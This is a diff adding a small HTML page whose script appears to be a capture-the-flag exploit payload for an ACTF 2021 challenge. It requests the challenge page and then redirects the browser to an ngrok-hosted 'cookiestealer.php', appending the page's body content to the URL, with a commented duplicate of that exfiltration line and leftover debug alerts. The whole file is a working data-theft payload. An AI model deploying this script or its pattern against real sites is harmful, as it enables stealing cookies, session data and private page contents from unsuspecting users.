@@ -1,0 +1,37 @@
+<html>
+<head>
+</head>
+<body>
+<script type="text/javascript">
+function makeHttpObject() {
+  try {return new XMLHttpRequest();}
+  catch (error) {}
+  try {return new ActiveXObject("Msxml2.XMLHTTP");}
+  catch (error) {}
+  try {return new ActiveXObject("Microsoft.XMLHTTP");}
+  catch (error) {}
+
+  throw new Error("Could not create HTTP request object.");
+}
+//alert('werk');
+var request = new XMLHttpRequest();
+//alert(request);
+//XMLHttpRequest.setRequestHeader("Access-Control-Allow-Origin", "")
+request.open("GET", "https://reactionpy.2021.chall.actf.co/", true);
+request.setRequestHeader("Access-Control-Allow-Origin", "*");
+request.send(null);
+//alert('werk');
+
+request.onreadystatechange = function() {
+  if (request.readyState == 4)
+  {
+    alert(document.body.innerHTML);
+    document.location="https://862cf64c8a26.ngrok.io/cookiestealer.php?c="+document.body.innerHTML;
+    alert('hmm');
+  }
+};
+
+//document.location="https://862cf64c8a26.ngrok.io/cookiestealer.php?c="+document.body.innerHTML;
+</script>
+</body>
+</html>
